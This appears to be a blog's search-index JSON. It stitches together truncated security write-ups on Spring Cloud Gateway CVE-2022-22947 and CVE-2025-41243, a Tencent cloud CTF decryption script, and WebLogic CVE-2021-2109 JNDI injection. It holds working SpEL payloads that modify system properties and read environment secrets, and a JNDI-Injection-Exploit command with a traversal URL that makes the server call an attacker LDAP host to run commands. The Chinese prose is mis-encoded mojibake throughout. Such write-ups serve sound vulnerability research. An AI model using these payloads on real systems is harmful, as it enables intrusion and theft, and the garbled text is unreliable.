[{"categories":["Java"],"content":"å‰è¨€\ræ–‡ç« é¦–å‘äºå…ˆçŸ¥ï¼šhttps://xz.aliyun.com/news/19006 å¾®ä¿¡å…¬ä¼—å·åˆ·åˆ°äº†è¿™ä¸ª cveï¼Œcvss 10 åˆ†ï¼Œä¸€ä¸ªæ»¡åˆ†æ¼æ´ï¼Œå®˜æ–¹é€šå‘Šï¼šhttps://spring.io/security/cve-2025-41243 å‘ç°ä¹‹å‰åœ¨å­¦ä¹  springboot çš„åˆ©ç”¨æ—¶ç®€å•çœ‹äº†ä¸‹å’Œè¿™ä¸ª cve ç±»ä¼¼çš„ä¸€ä¸ªæ´ï¼Œ cve-2022-22947 ï¼Œå½“æ—¶æ˜¯å­¦äº†ä¸‹å’‹æ‰“ï¼Œæ²¡å…·ä½“åˆ†ææºç ï¼Œè¿™ä¸ªæ»¡åˆ†æ¼æ´å…¶å®å°±æ˜¯å¯¹ 2022 é‚£ä¸ª cve çš„ä¸€ä¸ªï¼Œå…ˆåˆ†æä¸‹ 2022 çš„æ´ï¼Œæ–¹ä¾¿åç»­åˆ†æè¿™ä¸ª cve ","date":"2025-09-28","objectID":"/posts/d7e2c91/:1:0","tags":["Java"],"title":"Spring Cloud GateWay CVE-2025-41243","uri":"/posts/d7e2c91/"},{"categories":["Java"],"content":"CVE-2022-22947 SPEL RCE\rç¯å¢ƒï¼šhttps://github.com/spring-cloud/spring-cloud-gateway/ spring-cloud-gateway-sample/src/main/java/org/springframework/cloud/gateway/sample/GatewaySampleApplication.java å¯ä»¥ç›´æ¥å¯åŠ¨ è¿™é‡Œç”¨ 3.1.0 ç‰ˆæœ¬æ¼”ç¤º çœ‹ä¸‹å®˜æ–¹çš„ä¿®å¤ï¼šhttps://github.com/spring-cloud/spring-cloud-gateway/commit/337cef276bfd8c59fb421bfe7377a9e19c68fe1e å°† StandardEvaluationContext æ›´æ¢ä¸ºäº† GatewayEvaluationContext å»æ‰§è¡Œ Spel è¡¨è¾¾å¼ è¿™æ®µä»£ç ä½äº org/springframework/cloud/gateway/support/ShortcutConfigurable.java#getValue() æ–¹æ³•ä¸­ è¿™ä¸ªæ–¹æ³•çš„ä½œç”¨åˆ¤æ–­ä¼ å…¥çš„ entryValue æ˜¯å¦æ˜¯ä¸€ä¸ª SpEL è¡¨è¾¾å¼ï¼Œå¦‚æœæ˜¯ï¼Œå°±è§£æå¹¶æ‰§è¡Œ SpEL è¡¨è¾¾å¼ï¼Œåä¹‹ç›´æ¥è¿”å›åŸå€¼ã€‚ æœ‰ä¸‰ä¸ªæšä¸¾å€¼éƒ½è°ƒç”¨äº† getValue ï¼Œè¿™ä¸‰å¤„å°±åœ¨åŒæ¥å£çš„æšä¸¾ç±» ShortcutType ä¸­ï¼Œè¿™ä¸‰å¤„éƒ½é‡å†™äº† normalize å‡½æ•°ï¼Œè€Œä¸”åœ¨åŒæ¥å£ç±»ä¸­çš„ shortcutType æ–¹æ³•å¤„è°ƒç”¨äº†å…¶ä¸­ä¸€ä¸ªæšä¸¾å€¼ ç»§ç»­å‘ä¸Šæ‰¾ï¼Œæœ€ç»ˆåœ¨ org/springframework/cloud/gateway/support/ConfigurationService.java#normalizeProperties ä¸­å¯¹ filter çš„é…ç½®å±æ€§è¿›è¡Œè§£æï¼Œæœ€åè¿›å…¥ getValue æ‰§è¡Œ SPEL è¡¨è¾¾å¼é€ æˆ SPEL è¡¨è¾¾å¼æ³¨å…¥ æ¥ä¸‹æ¥çœ‹ä¸‹æ€ä¹ˆè®¾ç½® filter é…ç½®å±æ€§å€¼ï¼Œé€šè¿‡æŸ¥çœ‹å®˜æ–¹æ–‡æ¡£ï¼šhttps://cloud.spring.io/spring-cloud-gateway/multi/multi__actuator_api.htmlï¼Œå‘ç°ç”¨æˆ·å¯ä»¥é€šè¿‡ actuator åœ¨ç½‘å…³ä¸­åˆ›å»ºå’Œåˆ é™¤è·¯ç”±ï¼ˆä¸Šé¢è·¯ç”±æ ¼å¼ï¼‰ æœ€åå‘ç° org.springframework.cloud.gateway.actuate.AbstractGatewayControllerEndpoint#save æ–¹æ³•ç”¨æ¥å¤„ç†è¿™ä¸ªè·¯ç”±çš„ post è¯·æ±‚ è¿™ä¸ªæ–¹æ³•ç”¨æ¥éªŒè¯å¹¶ä¿å­˜è·¯ç”±ï¼Œè¯·æ±‚ä½“åŒ…å«éœ€ RouteDefinitionï¼Œçœ‹ä¸‹ RouteDefinition ç»§ç»­çœ‹ä¸‹ FilterDefinition è¿™é‡Œéœ€è¦æœ‰ä¸€ä¸ª name å’Œ args é”®å€¼å¯¹ï¼Œè¿™é‡Œåœ¨åˆ›å»ºè·¯ç”±æ—¶å¯¹ name å€¼è¿›è¡Œäº†æ ¡éªŒï¼Œå¿…é¡»æ˜¯ GatewayFilters ä¸­çš„æŸä¸ª gatewayFilterFactory å€¼ çœ‹ä¸‹æ‰€æœ‰çš„ gatewayFilterFactory å€¼ è¿™é‡Œæˆ‘ä»¬é€‰æ‹©ç”¨ AddResponseHeader ï¼Œå…¶ apply æ–¹æ³•å¯ä»¥å°† config çš„é”®å€¼å¯¹æ·»åŠ åˆ° header ä¸­ï¼Œè®¿é—®è¯¥è·¯ç”±æ—¶ä¼šå›æ˜¾å…¶ header å€¼ è¿™é‡Œåœ¨æ·»åŠ è·¯ç”±æ—¶éœ€è¦æ³¨æ„å‡ ç‚¹ï¼Œä¸€æ˜¯éœ€è¦ä¼  uri å’Œ order å€¼ï¼Œåœ¨org.springframework.cloud.gateway.route.Route#async æ–¹æ³•ä¸­å¯¹ RouteDefinition å‚æ•°è¿›è¡Œäº†å¤„ç†ï¼Œæ‰€ä»¥å¿…é¡»è¦æœ‰ uri å’Œ orderï¼Œä¸ç„¶ä¼šæŠ¥ç©ºæŒ‡é’ˆé”™è¯¯ï¼Œä¸” uri å¿…é¡»æ»¡è¶³æ­£å¸¸ url æ ¼å¼ äºŒæ˜¯ AddResponseHeader æ¥æ”¶çš„å€¼ç±»å‹æ˜¯ NameValueConfig ï¼Œå…¶ value å€¼å¿…é¡»æ˜¯ string ç»¼ä¸Šï¼Œå…ˆæ·»åŠ è·¯ç”±ï¼Œåˆ·æ–°ä¸€ä¸‹ï¼Œè®¿é—®åˆ›å»ºå¥½çš„è·¯ç”±å°±èƒ½çœ‹åˆ°å›æ˜¾ï¼Œå…ˆæ˜¯æ·»åŠ è·¯ç”± ç„¶ååˆ·æ–°è®¿é—®å³å¯ è°ƒè¯•ä¸€ä¸‹ï¼Œå…ˆæ˜¯åœ¨ org.springframework.cloud.gateway.support.ConfigurationService.ConfigurableBuilder#normalizeProperties éå† filters å±æ€§ ç„¶ååœ¨ org.springframework.cloud.gateway.support.ShortcutConfigurable.ShortcutType#normalize è°ƒç”¨ getValue è§£æå±æ€§ æœ€åå®ç° spel è¡¨è¾¾å¼æ³¨å…¥ ","date":"2025-09-28","objectID":"/posts/d7e2c91/:2:0","tags":["Java"],"title":"Spring Cloud GateWay CVE-2025-41243","uri":"/posts/d7e2c91/"},{"categories":["Java"],"content":"CVE-2025-41243 SPEL Property Modification\rè¿™é‡Œä»¥ 4.2.4 ç‰ˆæœ¬æ¥åˆ†æï¼Œç°åœ¨æ˜¯ GatewayEvaluationContext æ¥æ‰§è¡Œ spel è¡¨è¾¾å¼ï¼Œå¯ä»¥çœ‹åˆ°GatewayEvaluationContext å®é™…ä¸Šæ˜¯å°† spel è¡¨è¾¾å¼çš„æ‰§è¡Œå§”æ‰˜ç»™ SimpleEvaluationContextï¼Œè¿™ä¸ªç±»æ—¨åœ¨ä»…æ”¯æŒ SpEL è¯­è¨€è¯­æ³•çš„ä¸€ä¸ªå­é›†ï¼Œå®ƒä¸åŒ…æ‹¬ Javaç±»å‹å¼•ç”¨ï¼Œæ„é€ å‡½æ•°å’Œ bean å¼•ç”¨ï¼Œæ‰€ä»¥å®ƒä¸åƒ StandardEvaluationContext é‚£æ ·æ”¯æŒ T æ“ä½œç¬¦ å¹¶é»˜è®¤é€šè¿‡ RestrictivePropertyAccessor è¿›è¡Œä¸€äº›é¢å¤–çš„å®‰å…¨æ§åˆ¶ RestrictivePropertyAccessor æ–¹æ³•è¿™é‡Œé‡å†™äº† ReflectivePropertyAccessor ä¸­çš„ canRead æ–¹æ³•ï¼Œå…¶ä½œç”¨æ˜¯åœ¨æ‰§è¡Œ spel è¡¨è¾¾å¼æ—¶å°†æ‰€æœ‰å°è¯•è¯»å–ç›®æ ‡å¯¹è±¡çš„å±æ€§çš„æ“ä½œéƒ½æ‹’ç»ï¼Œä¹Ÿå°±æ˜¯ä¸å¯è¯» ä½†å…¶æ²¡æœ‰é‡å†™ canWrite æ–¹æ³• ä¹Ÿå°±æ˜¯è¯´ç°åœ¨ä¾æ—§æœ‰å¯å†™æƒé™ SimpleEvaluationContext å¯ä»¥é€šè¿‡ SpEL è¡¨è¾¾å¼è®¿é—®å’Œè°ƒç”¨ Spring Beanï¼Œè€Œä¸”è¿™é‡Œå·²æ³¨å†Œçš„ Bean åˆ—è¡¨ä¸ä»…é™äº Spring Cloud Gateway æœ¬èº«æ³¨å†Œçš„ Beanï¼Œè¿˜åŒ…æ‹¬ Spring Framework æ ¸å¿ƒæ³¨å†Œçš„ Beanï¼Œåœ¨ application.yml ä¸­è®¾ç½® management: endpoints: web: exposure: include: '*' endpoint: beans: enabled: true è®¿é—® /actuator/beans å°±å¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„ bean è¿™é‡Œç”¨åˆ°çš„æ˜¯ä¸¤ä¸ªç‰¹æ®Šçš„ beanï¼ŒsystemProperties å’Œ environmentï¼ŒsystemProperties å¯ç”¨äºä¿®æ”¹ç³»ç»Ÿå±æ€§ï¼Œ environment çš„ getPropertySources æ–¹æ³•å¯ç”¨äºè®¿é—®ç¯å¢ƒå˜é‡ç­‰ä¿¡æ¯ ç»¼ä¸Šï¼Œç­”æ¡ˆä¹Ÿå°±å‘¼ä¹‹æ¬²å‡ºäº†ï¼Œå…ˆç”¨ systemProperties å¯ç”¨äºä¿®æ”¹ç³»ç»Ÿå±æ€§ spring.cloud.gateway.restrictive-property-accessor.enabled ä¸º trueï¼Œç„¶åå°±å¯ä»¥ç”¨ getPropertySources æ¥è®¿é—®ç³»ç»Ÿå±æ€§å’Œç›¸å…³æ•æ„Ÿä¿¡æ¯äº† å…ˆæ˜¯å°† restrictive è®¾ç½®ä¸º false #{ @systemProperties['spring.cloud.gateway.restrictive-property-accessor.enabled'] = false} ç„¶ååœ¨ /actuator/gateway/refresh è·¯ç”±åˆ·æ–°ä¸€ä¸‹ï¼Œæ­¤æ—¶å°±å¯ä»¥åˆ©ç”¨ environment.getPropertySources å»è¯»ä¿¡æ¯äº† #{ @environment.getPropertySources.?[#this.name matches '.*optional:classpath:.*' ][0].source.![{#this.getKey+'='+#this.getValue.toString}] } è®°å¾—åˆ·æ–°ä¸€ä¸‹ï¼ŒæˆåŠŸè¯»åˆ°é…ç½®ä¿¡æ¯ ","date":"2025-09-28","objectID":"/posts/d7e2c91/:3:0","tags":["Java"],"title":"Spring Cloud GateWay CVE-2025-41243","uri":"/posts/d7e2c91/"},{"categories":["Java"],"content":"RCE\ræ—¢ç„¶å¯ä»¥ä¿®æ”¹ç³»ç»Ÿå±æ€§äº†ï¼Œé‚£éƒ¨åˆ†éœ€è¦æ»¡è¶³ä¸€å®šå±æ€§å€¼çš„ rce æ‰‹æ³•ä¹Ÿå°±èƒ½æ‰“é€šäº†ï¼Œå¦‚ h2 database console jndiï¼Œå¼€å¯ h2 console å¹¶å…è®¸å¤–éƒ¨è®¿é—® #{ @systemProperties['spring.h2.console.enabled'] = true} #{ @systemProperties['spring.h2.console.settings.web-allow-others'] = true} è¿™ç§ä¿®æ”¹å±æ€§æ¥ rce çš„è¯éœ€è¦é‡å¯ï¼Œæ„Ÿè§‰åˆ©ç”¨é¢ä¸å¤§ï¼Œä¸çŸ¥é“ä¸ºå•¥ 10 åˆ† ğŸ˜¿ è¿™é‡Œé“ä¸ªæ­‰ï¼Œåæ¥å‘ç°é‡å¯åè²Œä¼¼ä¹Ÿä¸ä¼šç”Ÿæ•ˆ é™¤æ­¤ä¹‹å¤–è¿˜æœ‰ jmxrmi æ¥ rce ç­‰ï¼Œæ›´æ”¹éœ€è¦æ”¹çš„å±æ€§å³å¯ï¼Œå¦‚æœæƒ³è¦æ¢ç´¢æ›´å¤šçš„åˆ©ç”¨æ–¹æ³•ï¼Œéœ€è¦æ‰¾ä¸€ä¸‹æ¶æ„çš„ bean ","date":"2025-09-28","objectID":"/posts/d7e2c91/:3:1","tags":["Java"],"title":"Spring Cloud GateWay CVE-2025-41243","uri":"/posts/d7e2c91/"},{"categories":["Java"],"content":"ä¿®å¤\rå®˜æ–¹ä¿®å¤ï¼šhttps://github.com/spring-cloud/spring-cloud-gateway/commit/b957599edcb26107d0e16d2675f7139a2be4d996 æ„å»º SimpleEvaluationContext æ—¶æ–°å¢ withAssignmentDisabled()ï¼Œç¦ç”¨äº†è¡¨è¾¾å¼ä¸­çš„èµ‹å€¼æ“ä½œï¼Œä¹Ÿå°±æ˜¯ä¸èƒ½ä¿®æ”¹å±æ€§å€¼äº† åŒæ—¶è¡¥å……äº†ç›¸å…³å§”æ‰˜æ–¹æ³•ï¼Œå¹¶æ–°å¢æ–¹æ³• testNormalizeDefaultTypeWithSpelAssignmentAndInvalidInputFails éªŒè¯èµ‹å€¼è¡Œä¸ºè¢«æ‹¦æˆª ","date":"2025-09-28","objectID":"/posts/d7e2c91/:3:2","tags":["Java"],"title":"Spring Cloud GateWay CVE-2025-41243","uri":"/posts/d7e2c91/"},{"categories":["Java"],"content":"å‚è€ƒ\rhttps://y4er.com/posts/cve-2022-22947-springcloud-gateway-spel-rce-echo-response/ https://blog.z3r.ru/posts/spring-cloud-gateway-spel-vuln/ ","date":"2025-09-28","objectID":"/posts/d7e2c91/:4:0","tags":["Java"],"title":"Spring Cloud GateWay CVE-2025-41243","uri":"/posts/d7e2c91/"},{"categories":["Cloud Security"],"content":"å‰è¨€\rè…¾è®¯å‡ºäº†ä¸ªäº‘å®‰å…¨æŒ‘æˆ˜èµ›ï¼Œä¸€å¹´æœ‰å…­æœŸï¼Œé’ˆå¯¹çš„æ˜¯è‡ªå®¶æœåŠ¡ï¼Œå¦‚ cos ç­‰ï¼Œåº”è¯¥æ˜¯å¯¹æ ‡å›½å¤– wiz çš„æœˆèµ›ï¼Œä¸å‡ºæ„å¤–çš„è¯æ¯æœŸéƒ½ä¼šæ‰“ä¸€ä¸‹ï¼Œæ‰€ä»¥è¿™ç¯‡ wp åº”è¯¥æ˜¯ä¼šæŒç»­æ›´æ–°ä¸­ ","date":"2025-09-19","objectID":"/posts/cebf4ad/:1:0","tags":["Cloud Security"],"title":"è…¾è®¯äº‘å®‰å…¨æŒ‘æˆ˜èµ›2025wp","uri":"/posts/cebf4ad/"},{"categories":["Cloud Security"],"content":"1-COSææƒä¸åˆ©ç”¨\rè§£å¯†è„šæœ¬ import base64 from typing import Optional KEY = b\"Lxnt1evByMdubwx9\" DATA = [ \"f5c0IajdxV5eVjXjZL7eYXn/8TRigzvvoMHicHjAF+2fYjYNyxz7GaIlcemYMPY6sIftXGoliO4vGWY+3BUGsP/oIYMQP3QYC0oL/H7Wa20=\", \"zKgyUbTtAghnzfmaHNHYdWvzlcTYqJt9aiMcsXRZVx0DvlWf0Gj6gx+r7S0cDZB1T/GszB4Soj0cHkbPC6TFsDx4UfhOQF6UaQ+jyuH8CbKHhnJqvrM7XINfLw8Ciwj4Iw3ydAaU5s5VS1BsHuJqeCAlPGF0BaTv45iaL//SJObHe+grFNPKDhJsLfk4ZqmmHlt5MYIsja5I1pG756DWS/nwzQR/VpV/oXKucRrb7ZU=\", \"LcQJPx4C3QLMP6FCg7LZiA==\", \"M/5OfYlXv69rGbpWpS3StQ==\", \"EQvKwDX7dY92+pllBJ07+OXaSC5ebcc3U3XPpPtNYvM=\", \"MgkE9JTw5fUTSYvyQKBfFw==\", \"MgkE9JTw5fUTSYvyQKBfFw==\", \"y2iOBN6+m4LXl+5oKipU2qjfXHyCsLw0l+p/v3cSqPc=\", \"pXG83JbitgEqtVYeh84f0Q==\", \"0yrL8z5DCpVMMLIqsNgKWhakEvoQBz6JYZBii6gszbs=\", \"y2iOBN6+m4LXl+5oKipU2qjfXHyCsLw0l+p/v3cSqPc=\", \"y2iOBN6+m4LXl+5oKipU2qjfXHyCsLw0l+p/v3cSqPc=\", \"lvSA8w7VxVeGXKlGMKudyOXaSC5ebcc3U3XPpPtNYvM=\", \"yVwXQuzRFa/QrCfUbQmTNhbcG5zRqvZr/0xdeH40eaYelVLemG27zQ5lRugzqJ1b\", \"yVwXQuzRFa/QrCfUbQmTNqW/Xe/gznGzrFAZX4FtuFoelVLemG27zQ5lRugzqJ1b\", \"yVwXQuzRFa/QrCfUbQmTNgJcKv9GTUTyC6vkp1YbTGVysQYDBniEBjebTZ5oprEQ\", \"jiIi5TuBvaPaTOUxy5UeXw==\", \"5dpILl5txzdTdc+k+01i8w==\", \"Xwjo9538numKdVOf8Vh4cE78T18+6TwNy3pgqXy7tYb5yVtGSgxDhPNOnqo0lDCzBLGnWanr7bxhlsLmeVJIOpDBLi/DWjMg8hjHMwtt5RQsVhvyvSJ6Ps9g1P+pfAjx\", \"xH3OngU0AEUjMBlvI0gZrm11cDVQ9PhpXofmHTxRgvOAlKjgRHDmwP0qXIL/Dxkfx2qGTPxXDwaSyqTaQgytLg==\", \"Pzk6aAkFE1N1ctcijLbyEeXfrGGVQ0sDdZ3bKsM4yxILvkCjXEaUM8dVWffz6Sil1U2bSszksAuUE8X/fmrh1ozdiRHbs/gv1nu6T/tDHePygRV2tpSWVj8mjDLsNviWHDnUFrGSEa6TkGGRvdI2ANsVsXQg7FGQRRzdoHvnrP74vEjkezrkLNLuwCJhJ7Okz1CTpOR+zDVkIR8NGn+nBTLb0I05ZPrsNVNEW475JI28iLND80w1UPfaBzN8lE8WBKMFqQfGp7vvw/UJ9O6x4K0QvNM8CoO2jqPbV9XoeTAWArROvj+HuHshrr0qlEdE1QB1pC6xxQAS5F09AuMZ0JgBN6n7CYhI/feY76UGg1jGwWnXhyJ2043vFpLNji5Hwk0SSJ2pi5bsoTE1ipsm8TpppD/KND8Y4NPU5VnjWVcz7Ib0A1frMTsGKjQNBqPb7y2c0zu5nck3aAi4+iL36pkR4LaeYb/NXE89zJQhLUJzH+rjHHLrTo+DoPG5AtMG/H9/qtGxwD11Ox3qRQg1FpBFy+nSf348ZT0sRED14vzUKmcptDdeNord5Q/k5GI7cAl8DysyyWSgVet/LlljCzvDqr70wRhu31uv4AL27Vq9Y9ee9qOkvWY+QN4eBUK+mD/LJyKA3C8zuRPbeDT7KkXW+JpPd+sue1UisMskKA+MxIAsAxCrxXQfYLAKXSErP2uLlE3VRjb0lZXYewkEvOBcz/BVxR3lyyQdbHL3Uo5euY/yWySBUEmkgeeC7wtVjbcV8wDewfPx2YV5gW4jXacDR56XG591wdPzpZMMk3rdnBx4yFGX93g0kAlXvdoPnd2UFsdnavYd++X2rmTBdjOo/jGuH/gWJ7m5oLzsVC24W4eVS7RURyFmQ7FKb7JC3xdQVWYKzD/HgEdQ5dPcEzgT/fWkc+Iy31zfp2WLYco1FGSCONok8VchDlvRKjH5tgV4ZiWG2I2254XRB5nwgVy9EkZPW/CbCz78zQBXXtmmzZt4cDtGCFCPYKMMXUyNTD4RPFU6h6orOVg6H7KcQO8KhSE0LnleygySrue5E6IIWinPy1vRlDB9HVG+u0eWbNZLKxa1cOSyi3+eD9EunA049WzMQE3bZBsXVZh8aBN9+p9JJYnZbu0GdBewIJy22rS0iCTL9R40CW8LSVlm2XA2ozYLw3AzXXbS8EgK1zA5umnrPLSQtyQXh6tPT9lIfd4FPcLdfcJqXv69K2WX1rThIybol7A8Z7seaVJpFuJ3WtDhtyTuDkl/c1s1QRsqW41Bx87kC6NCiSTzlcbtQg==\", \"y2iOBN6+m4LXl+5oKipU2qjfXHyCsLw0l+p/v3cSqPc=\", \"x3lpg57ERvpVLrn83osro5kYWOcXD1WP+7hoGTXF95Zn1tPhRUZ8jl6it2l7P2dP5dpILl5txzdTdc+k+01i8w==\", \"nQe10a7TnkOr/Ppd++egqGi535SDz26TF3POeWJkfBvmaMo5aBJ0/+JogjC/WxHq\", \"R+koVdpCqrYoUtcwv9vXysqBKV8eNMz2HJHMRG2nsm0=\" ] def _try_pycryptodome(raw: bytes) -\u003e Optional[bytes]: try: from Crypto.Cipher import AES as _AES from Crypto.Util.Padding import unpad as _unpad cipher = _AES.new(KEY, _AES.MODE_ECB) dec = cipher.decrypt(raw) return _unpad(dec, 16) except Exception: return None def _try_cryptography(raw: bytes) -\u003e Optional[bytes]: try: from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes cipher = Cipher(algorithms.AES(KEY), modes.ECB()) decryptor = cipher.decryptor() dec = decryptor.update(raw) + decryptor.finalize() pad = dec[-1] if not (1 \u003c= pad \u003c= 16): raise ValueError(\"Bad padding\") return dec[:-pad] except Exception: return None def aes_ecb_pkcs5_decrypt(b64s: str) -\u003e str: raw = base64.b64decode(b64s) dec = _try_pycryptodome(raw) if dec is None: dec = _try_cryptography(raw) if dec is None: raise RuntimeError(\"No AES backend available. Please install pycryptodome or cryptography.\") return dec.decode(\"utf-8\", errors=\"replace\") def looks_like_base64(s: str) -\u003e bool: try: base64.b64decode(s, validate=True) return True except Exception: return False def d","date":"2025-09-19","objectID":"/posts/cebf4ad/:2:0","tags":["Cloud Security"],"title":"è…¾è®¯äº‘å®‰å…¨æŒ‘æˆ˜èµ›2025wp","uri":"/posts/cebf4ad/"},{"categories":["Java"],"content":"å‰è¨€\rç›¸å¯¹äºå‰é¢çš„ååºåˆ—åŒ–æ´ï¼Œä»¥ä¸‹å‡ ä¸ªæ´æ¯”è¾ƒç®€å•ï¼Œå°±ä¸å¤šåŠ åˆ†æäº†ï¼Œä¸»è¦çœ‹ä¸‹æ€ä¹ˆæ‰“ ","date":"2025-05-11","objectID":"/posts/0846c48/:1:0","tags":["Java"],"title":"Weblogicå­¦ä¹ (2)","uri":"/posts/0846c48/"},{"categories":["Java"],"content":"CVE-2021-2109 WebLogic JNDI æ³¨å…¥\r","date":"2025-05-11","objectID":"/posts/0846c48/:2:0","tags":["Java"],"title":"Weblogicå­¦ä¹ (2)","uri":"/posts/0846c48/"},{"categories":["Java"],"content":"ç¯å¢ƒæ­å»º\rå‚è€ƒT3ååºåˆ—åŒ–çš„ç¯å¢ƒï¼Œéœ€è¦å¤šåŠ ä¸€ä¸ª \\server\\lib\\consoleapp\\webapp\\WEB-INF\\lib\\console.jar åˆ°ä¾èµ–ä¸­ docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21 ","date":"2025-05-11","objectID":"/posts/0846c48/:2:1","tags":["Java"],"title":"Weblogicå­¦ä¹ (2)","uri":"/posts/0846c48/"},{"categories":["Java"],"content":"æ¼æ´åˆ†æ\råˆ©ç”¨å‰æ\rOracle WebLogic Server 10.3.6.0.0ã€12.1.3.0.0ã€12.2.1.3.0ã€12.2.1.4.0ã€14.1.1.0.0 è¿™é‡Œè¦è¿›å…¥åˆ° /console/consolejndi.portal è·¯ç”±é‡Œæ‰èƒ½æ‰“ æ¼æ´åˆ†æ\råŸç†å°±æ˜¯WebLogic çš„ /console/consolejndi.portal æ¥å£å¯ä»¥è°ƒç”¨å­˜åœ¨ JNDI æ³¨å…¥æ¼æ´çš„ com.bea.console.handles.JndiBindingHandle ç±»ï¼Œä»è€Œé€ æˆ RCEï¼Œæ‰€ä»¥è¦åœ¨è¿›åå°çš„å‰æä¸‹æ‰èƒ½æ‰“ è¿™é‡Œç”¨åˆ°çš„å·¥å…·ä¸ºï¼šhttps://github.com/welk1n/JNDI-Injection-Exploit java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \"touch /tmp/jndi_test\" -A 192.168.2.1 payloadä¸º /console/css/%252e%252e%252fconsolejndi.portal?_pageLabel=JNDIBindingPageGeneral\u0026_nfpb=true\u0026JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.2;1:1389/mezyww;AdminServer%22) è¿™é‡Œå°±æ˜¯ ; è€Œä¸æ˜¯ . çœ‹åˆ° \\server\\lib\\consoleapp\\webapp ä¸‹çš„ consolejndi.portal ï¼Œå°±æ˜¯æˆ‘ä»¬åˆšæ‰ payload ä¸­è®¿é—®çš„è·¯ç”± å…·ä½“çš„å¤„ç†é€»è¾‘åœ¨ /PortalConfig/jndi/jndibinding.portlet å¯ä»¥å‘ç°åœ¨ com.bea.console.actions.jndi.JNDIBindingAction#execute ä¸­å°±æ˜¯å¤„ç†é€»è¾‘ å…ˆè·å– jndi ä¸Šä¸‹æ–‡ç„¶åå°±ç›´æ¥ lookup äº†ï¼Œç°åœ¨å…ˆçœ‹ä¸‹æ€ä¹ˆæ§åˆ¶ serverMBean äº†ï¼Œè€Œä¸€ç›´å¾€ä¸Šè¿½æº¯å…¶èµ‹å€¼ï¼Œå¤§æ¦‚å¯ä»¥ç”¨ä¸‹é¢è¿™ä¸ªèµ‹å€¼é“¾è¡¨ç¤º JndiBindingHandle bindingHandle = (JndiBindingHandle)this.getHandleContext(actionForm, request, \"JNDIBinding\"); -\u003e String serverName = bindingHandle.getServer(); -\u003e ServerMBean serverMBean = domainMBean.lookupServer(serverName); ä» domainMBean.lookupServer(serverName) å¼€å§‹åˆ†æï¼Œè¿™é‡Œæ˜¯åŠ¨æ€ä»£ç†è°ƒç”¨ï¼Œç”¨çš„æ˜¯ weblogic.management.jmx.MBeanServerInvocationHandler#invoke è¿™é‡Œ var2 å°±æ˜¯è¦è°ƒç”¨çš„æ–¹æ³• weblogic.management.configuration.DomainMBean#lookupServer ï¼Œvar3 åˆ™æ˜¯è¦ä¼ è¿›å»çš„å‚æ•°ï¼Œç„¶åå‘ç° var2 çš„å®ç°ç±»æ˜¯ weblogic.management.configuration.DomainMBeanImpl#lookupServer public ServerMBean lookupServer(String var1) { Iterator var2 = Arrays.asList((Object[])this._Servers).iterator(); ServerMBeanImpl var3; do { if (!var2.hasNext()) { return null; } var3 = (ServerMBeanImpl)var2.next(); } while(!var3.getName().equals(var1)); return var3; } è¿™é‡Œ this._Servers æ˜¯ä¸€ç»„æœåŠ¡å™¨å¯¹è±¡ï¼Œä¼šä¾æ¬¡å–å‡ºå…¶ä¸­çš„å®ä¾‹å¹¶åˆ¤æ–­å…¶ getName è¿”å›çš„å€¼æ˜¯å¦ä¸ºæˆ‘ä»¬ä¼ è¿›å»çš„ var1 æˆ‘ä»¬è‚¯å®šä¸èƒ½è¿”å› nullï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»è¦è®©ä¼ è¿›å»çš„ var1 ç­‰äºå…¶ getName å€¼ï¼Œè¿™é‡Œåªæœ‰ä¸€ä¸ªå®ä¾‹ï¼Œå…¶ getName è¿”å›çš„å€¼ä¸º AdminServer å› æ­¤æˆ‘ä»¬ä¼ å…¥çš„ var1 å€¼ä¸º AdminServer ï¼Œæ ¹æ®ä¹‹å‰æˆ‘ä»¬çš„èµ‹å€¼é“¾å¯ä»¥å‘ç° var1 å°±æ˜¯ serverNameï¼Œè·Ÿè¿›ä¸‹ getServer æ–¹æ³•ä¼šå‘ç°å…¶å€¼æ˜¯å¯æ§çš„ï¼Œä¼šè¿”å› getComponent æ–¹æ³•è·å¾—çš„æ•°ç»„ä¸­ç´¢å¼•ä¸º 2 çš„å€¼ï¼Œè¿™ä¸ªæ–¹æ³•å¾…ä¼šåˆ†æ public String getServer() { return this.getComponent(2); } è‡³æ­¤ c != null å·²ç»å¯ä»¥æ»¡è¶³ï¼Œç°åœ¨çœ‹çœ‹ jndi lookup çš„åœ°å€æ€ä¹ˆæ§åˆ¶ è·Ÿè¿›å‘ç°å…¶ä¸¤ä¸ª getter æ–¹æ³•éƒ½æ˜¯è°ƒç”¨çš„ ï¼Œè€Œä¸”éƒ½æ˜¯ç”¨åˆ° getComponent æ–¹æ³•è¿”å›çš„æ•°ç»„ æœ€åè·Ÿè¿›åˆ° com.bea.console.handles.HandleImpl#getComponents() ï¼Œè¿™ä¸ªæ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯ç”¨ ; æ¥åˆ†éš”æ•°ç»„ä¸­çš„æ¯ä¸ªç»„ä»¶ æ‰€ä»¥æœ€åæ„é€  payload çš„æ—¶å€™å°±å¾ˆæ¸…æ™°äº†ï¼Œå†™ä¸‰ä¸ªç»„ä»¶ï¼Œå‰ä¸¤ä¸ªæ˜¯ jndi çš„è¿œç¨‹åœ°å€ï¼Œæœ€åä¸€ä¸ªä¸º AdminServer å°±å¥½äº†ï¼Œç”¨ ; åˆ†éš” æ¼æ´ä¿®å¤\råŠ äº†ä¸ªå‡½æ•°æ¥åˆ¤æ–­ä¼ è¿› lookup æ–¹æ³•çš„å€¼ åªå…è®¸ä»¥ java: å¼€å¤´çš„æœ¬åœ° JNDI åç§°ï¼Œè¿œç¨‹çš„å¦‚ rmiï¼Œldap å°±ä¸è¡Œäº† ","date":"2025-05-11","objectID":"/posts/0846c48/:2:2","tags":["Java"],"title":"Weblogicå­¦ä¹ (2)","uri":"/posts/0846c48/"},{"categories":["Java"],"content":"å°ç»“\ré™åˆ¶æ¯”è¾ƒå¤§æ„Ÿè§‰ï¼Œè¦è¿›åå°ï¼Œæ¼æ´æœ¬èº«çš„åˆ©ç”¨æ€è·¯è¿˜æ˜¯éå¸¸æœ‰è¶£çš„ ","date":"2025-05-11","objectID":"/posts/0846c48/:2:3","tags":["Java"],"title":"Weblogicå­¦ä¹ 